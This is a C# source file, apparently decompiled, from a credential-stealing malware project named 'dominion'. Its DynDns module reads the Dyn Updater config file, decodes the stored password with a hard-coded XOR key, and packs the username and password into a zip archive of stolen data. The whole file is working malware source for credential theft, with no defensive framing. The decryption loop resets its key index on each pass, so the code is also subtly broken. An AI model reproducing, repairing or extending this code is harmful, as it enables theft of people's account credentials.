using dominion.src.dominion.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.IO;
using System.Text;
using System.Threading.Tasks;

namespace dominion.src.dominion.Stealer.Applications
{
    public class DynDns : ITarget
    {
        // Token: 0x06000193 RID: 403 RVA: 0x0000D914 File Offset: 0x0000BB14
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "C:\\ProgramData\\Dyn\\Updater\\config.dyndns";
            if (File.Exists(text))
            {
                string[] array = File.ReadAllLines(text);
                if (array.Length != 0)
                {
                    string text2 = "Dyn\\Passwords.txt";
                    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                    counterApplications.Name = "Dyn";
                    counterApplications.Files.Add(text + " => " + text2);
                    counter.Applications.Add(counterApplications);
                    zip.AddTextFile(text2, "UserName: " + array[1].Substring(9) + "\r\nPassword: " + this.DecryptDynDns(array[2].Substring(9)));
                }
            }
        }

        // Token: 0x06000194 RID: 404 RVA: 0x0000D9A4 File Offset: 0x0000BBA4
        private string DecryptDynDns(string encrypted)
        {
            string text = string.Empty;
            for (int i = 0; i < encrypted.Length; i += 2)
            {
                text += ((char)int.Parse(encrypted.Substring(i, 2), NumberStyles.HexNumber)).ToString();
            }
            char[] array = text.ToCharArray();
            char[] array2 = new char[text.Length];
            for (int j = 0; j < array2.Length; j++)
            {
                try
                {
                    int num = 0;
                    array2[j] = (char)(array[j] ^ Convert.ToChar("t6KzXhCh".Substring(num, 1)));
                    num = (num + 1) % 8;
                }
                catch (Exception)
                {
                }
            }
            return new string(array2);
        }
    }
}
